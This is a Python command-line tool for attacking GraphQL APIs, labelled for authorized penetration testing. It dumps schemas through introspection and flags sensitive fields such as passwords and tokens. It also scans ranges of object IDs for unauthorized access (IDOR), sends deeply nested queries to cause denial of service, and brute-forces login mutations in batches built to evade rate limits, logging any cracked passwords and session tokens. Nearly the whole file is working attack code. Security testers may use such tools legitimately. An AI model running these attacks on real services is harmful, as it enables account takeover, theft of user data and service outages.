#!/usr/bin/env python3
# Authorized penetration testing only
"""graphql_raider.py — automated GraphQL security testing: introspection, IDOR scan, batch brute-force, depth DoS, full recon."""

import json
import time
import logging
import argparse
from datetime import datetime

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

INTROSPECTION_QUERY = """
query IntrospectionFull {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind name description
      fields(includeDeprecated: true) {
        name description isDeprecated deprecationReason
        args { name description defaultValue type { kind name ofType { kind name ofType { kind name } } } }
        type { kind name ofType { kind name ofType { kind name } } }
      }
      inputFields { name description defaultValue type { kind name ofType { kind name } } }
      enumValues(includeDeprecated: true) { name description isDeprecated }
      possibleTypes { kind name }
    }
  }
}
"""

SENSITIVE_FIELD_NAMES = [
    "password", "passwordHash", "secret", "token", "apiKey", "accessToken",
    "refreshToken", "resetToken", "twoFactorSecret", "backupCode", "isAdmin",
    "role", "permissions", "creditCard", "ssn", "internalNote", "adminNote",
    "debugInfo", "rawData", "privateKey", "sessionToken",
]

INTERESTING_MUTATION_NAMES = [
    "delete", "admin", "grant", "revoke", "impersonate", "sudo", "elevate",
    "transfer", "reset", "bypass", "internal", "debug", "disable", "enable",
    "promote", "ban", "unban", "purge",
]


def gql_request(url, query, variables=None, headers=None, timeout=15):
    """Send a single GraphQL request."""
    h = {"Content-Type": "application/json"}
    if headers:
        h.update(headers)
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    try:
        resp = requests.post(url, json=payload, headers=h, timeout=timeout, verify=False)
        return resp.status_code, resp.json() if resp.text else {}
    except requests.RequestException as e:
        return None, {"error": str(e)}
    except json.JSONDecodeError:
        return None, {"error": "non-JSON response"}


def gql_batch_request(url, queries, headers=None, timeout=30):
    """Send a batch of GraphQL operations in one HTTP request."""
    h = {"Content-Type": "application/json"}
    if headers:
        h.update(headers)
    try:
        resp = requests.post(url, json=queries, headers=h, timeout=timeout, verify=False)
        return resp.status_code, resp.json() if resp.text else []
    except requests.RequestException as e:
        return None, {"error": str(e)}


# ─── Mode: introspect ────────────────────────────────────────────────────────

def run_introspect(url, headers):
    """Dump the full GraphQL schema via introspection."""
    logger.info("Running introspection against %s", url)
    status, data = gql_request(url, INTROSPECTION_QUERY, headers=headers)

    if not status or "errors" in data:
        errors = data.get("errors", [{}])
        msg = errors[0].get("message", "") if errors else ""
        logger.warning("Introspection may be disabled: %s", msg)
        return {"introspection_enabled": False, "error": msg}

    schema = data.get("data", {}).get("__schema", {})
    findings = {"introspection_enabled": True, "schema": schema, "interesting": []}

    for t in schema.get("types", []):
        if t["name"].startswith("__"):
            continue
        for field in t.get("fields") or []:
            fname = field["name"].lower()
            if any(s in fname for s in SENSITIVE_FIELD_NAMES):
                findings["interesting"].append({
                    "type": t["name"],
                    "field": field["name"],
                    "reason": "sensitive field name",
                    "deprecated": field.get("isDeprecated"),
                })
            if t["name"] == "Mutation":
                if any(kw in fname for kw in INTERESTING_MUTATION_NAMES):
                    findings["interesting"].append({
                        "type": "Mutation",
                        "field": field["name"],
                        "reason": "high-value mutation keyword",
                    })

    logger.info("Schema dumped. %d interesting fields found.", len(findings["interesting"]))
    for item in findings["interesting"]:
        logger.warning("  [%s] %s.%s — %s", "INTERESTING", item["type"], item["field"], item["reason"])

    return findings


# ─── Mode: check-batching ────────────────────────────────────────────────────

def check_batching(url, headers):
    """Check if GraphQL batching is enabled."""
    logger.info("Checking batching support...")
    batch = [{"query": "{ __typename }"}, {"query": "{ __typename }"}]
    status, data = gql_batch_request(url, batch, headers=headers)

    if isinstance(data, list):
        logger.warning("Batching ENABLED — %d responses returned for 2-op batch", len(data))
        return {"batching_enabled": True, "severity": "high"}
    logger.info("Batching disabled or not supported.")
    return {"batching_enabled": False}


# ─── Mode: depth-test ────────────────────────────────────────────────────────

def run_depth_test(url, headers, query_field="user { friends", max_depth=15):
    """Test query depth limits by increasing nesting until rejection or timeout."""
    logger.info("Testing query depth limits (max=%d)...", max_depth)
    results = []
    for depth in range(2, max_depth + 1):
        inner = "id name"
        nesting = (query_field + " { ") * (depth - 1) + inner + " }" * (depth - 1)
        query = "{ " + nesting + " }"
        start = time.time()
        status, data = gql_request(url, query, headers=headers, timeout=30)
        elapsed = time.time() - start
        has_error = bool(data.get("errors")) if isinstance(data, dict) else True
        results.append({"depth": depth, "status": status, "time_s": round(elapsed, 2), "error": has_error})
        logger.info("  Depth %d → status=%s time=%.2fs error=%s", depth, status, elapsed, has_error)
        if has_error and depth > 5:
            logger.info("  Server rejected at depth %d — depth limiting likely in place", depth)
            break
        if elapsed > 10:
            logger.warning("  Depth %d caused >10s response — potential DoS", depth)

    vulnerable = any(r["depth"] >= 8 and not r["error"] and r["time_s"] < 5 for r in results)
    return {"depth_results": results, "depth_limit_missing": vulnerable, "severity": "high" if vulnerable else "info"}


# ─── Mode: idor-scan ─────────────────────────────────────────────────────────

def run_idor_scan(url, headers, query_template, id_range="1-100"):
    """Probe a range of IDs to detect IDOR vulnerabilities."""
    start_id, end_id = (int(x) for x in id_range.split("-"))
    logger.info("IDOR scan: IDs %d-%d", start_id, end_id)
    findings = []

    # Batch IDs 20 at a time using aliases
    chunk_size = 20
    ids = list(range(start_id, end_id + 1))

    for chunk_start in range(0, len(ids), chunk_size):
        chunk = ids[chunk_start:chunk_start + chunk_size]
        alias_queries = "\n".join(
            f'  id_{i}: ' + query_template.replace("ID_PLACEHOLDER", str(i)).strip().lstrip("{").rstrip("}")
            for i in chunk
        )
        batch_query = "{\n" + alias_queries + "\n}"
        status, data = gql_request(url, batch_query, headers=headers)
        if not isinstance(data, dict) or "data" not in data:
            continue
        for key, value in (data.get("data") or {}).items():
            if value:
                target_id = int(key.replace("id_", ""))
                logger.warning("  IDOR: data returned for id=%d → %s", target_id, str(value)[:120])
                findings.append({"id": target_id, "data": value})

    logger.info("IDOR scan complete. %d accessible objects found.", len(findings))
    return {"idor_findings": findings, "severity": "critical" if findings else "info"}


# ─── Mode: batch-bruteforce ──────────────────────────────────────────────────

def run_batch_bruteforce(url, headers, email, password_list_path, batch_size=50):
    """Brute-force a login mutation using GraphQL batching to bypass rate limits."""
    logger.info("Batch brute-force: %s", email)
    login_mutation = """
    mutation Login($email: String!, $password: String!) {
      login(email: $email, password: $password) {
        token
        user { id role }
      }
    }
    """
    passwords = open(password_list_path).read().splitlines()
    logger.info("Loaded %d passwords. Batch size: %d", len(passwords), batch_size)
    found = []

    for i in range(0, len(passwords), batch_size):
        batch_passwords = passwords[i:i + batch_size]
        batch = [
            {
                "query": login_mutation,
                "variables": {"email": email, "password": pw}
            }
            for pw in batch_passwords
        ]
        status, responses = gql_batch_request(url, batch, headers=headers)
        if not isinstance(responses, list):
            logger.warning("Batch rejected or not array response — batching may be disabled")
            break
        for j, resp in enumerate(responses):
            token = None
            try:
                token = resp.get("data", {}).get("login", {}).get("token")
            except (AttributeError, TypeError):
                pass
            if token:
                pw = batch_passwords[j]
                logger.warning("CREDENTIAL FOUND: %s / %s → token: %s...", email, pw, token[:20])
                found.append({"email": email, "password": pw, "token": token})
        time.sleep(0.2)

    return {"credentials_found": found, "severity": "critical" if found else "info"}


# ─── Mode: full ──────────────────────────────────────────────────────────────

def run_full(url, headers):
    """Run all non-destructive checks in sequence."""
    report = {"url": url, "timestamp": datetime.utcnow().isoformat(), "findings": {}}

    report["findings"]["introspection"] = run_introspect(url, headers)
    report["findings"]["batching"] = check_batching(url, headers)
    report["findings"]["depth_test"] = run_depth_test(url, headers)

    # Check GET mutations (CSRF)
    logger.info("Checking GET-based mutations (CSRF)...")
    try:
        resp = requests.get(
            url, params={"query": "mutation { __typename }"},
            headers={k: v for k, v in (headers or {}).items()},
            timeout=10, verify=False
        )
        data = resp.json() if resp.text else {}
        get_mutation_works = "data" in data and "__typename" in str(data.get("data", ""))
        report["findings"]["csrf_get_mutation"] = {
            "vulnerable": get_mutation_works,
            "severity": "high" if get_mutation_works else "info",
        }
        if get_mutation_works:
            logger.warning("CSRF via GET mutation: server executes mutations over GET requests")
    except Exception as e:
        report["findings"]["csrf_get_mutation"] = {"error": str(e)}

    # Summary
    severity_order = ["critical", "high", "medium", "low", "info"]
    max_sev = "info"
    for finding in report["findings"].values():
        sev = finding.get("severity", "info")
        if severity_order.index(sev) < severity_order.index(max_sev):
            max_sev = sev
    report["overall_severity"] = max_sev

    total_interesting = len(
        report["findings"].get("introspection", {}).get("interesting", [])
    )
    logger.info(
        "Full scan complete. Overall severity: %s. Interesting fields: %d.",
        max_sev.upper(), total_interesting
    )
    return report


# ─── Entry point ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="GraphQL Raider — authorized security testing")
    parser.add_argument("--url", required=True, help="GraphQL endpoint (e.g. https://target.com/graphql)")
    parser.add_argument("--token", default=None, help="Authorization header value (e.g. 'Bearer eyJ...')")
    parser.add_argument("--cookie", default=None, help="Cookie header value (e.g. 'session=abc123')")
    parser.add_argument(
        "--mode",
        choices=["introspect", "check-batching", "depth-test", "idor-scan", "batch-bruteforce", "full"],
        default="full",
    )
    parser.add_argument("--query", default='{ user(id: ID_PLACEHOLDER) { id email role } }',
                        help="Query template with ID_PLACEHOLDER for idor-scan mode")
    parser.add_argument("--id-range", default="1-100", help="ID range for idor-scan (e.g. 1-500)")
    parser.add_argument("--query-field", default="user { friends", help="Field path for depth-test")
    parser.add_argument("--max-depth", type=int, default=15, help="Max nesting depth for depth-test")
    parser.add_argument("--email", default=None, help="Email for batch-bruteforce mode")
    parser.add_argument("--password-list", default=None, help="Password list file for batch-bruteforce")
    parser.add_argument("--batch-size", type=int, default=50, help="Batch size for batch-bruteforce")
    parser.add_argument("-o", "--output", default="graphql_report.json", help="Output JSON report path")
    args = parser.parse_args()

    headers = {}
    if args.token:
        headers["Authorization"] = args.token
    if args.cookie:
        headers["Cookie"] = args.cookie

    mode_map = {
        "introspect": lambda: run_introspect(args.url, headers),
        "check-batching": lambda: check_batching(args.url, headers),
        "depth-test": lambda: run_depth_test(args.url, headers, args.query_field, args.max_depth),
        "idor-scan": lambda: run_idor_scan(args.url, headers, args.query, args.id_range),
        "batch-bruteforce": lambda: run_batch_bruteforce(
            args.url, headers, args.email, args.password_list, args.batch_size
        ),
        "full": lambda: run_full(args.url, headers),
    }

    result = mode_map[args.mode]()
    with open(args.output, "w") as f:
        json.dump(result, f, indent=2, default=str)
    logger.info("Report saved → %s", args.output)


if __name__ == "__main__":
    main()
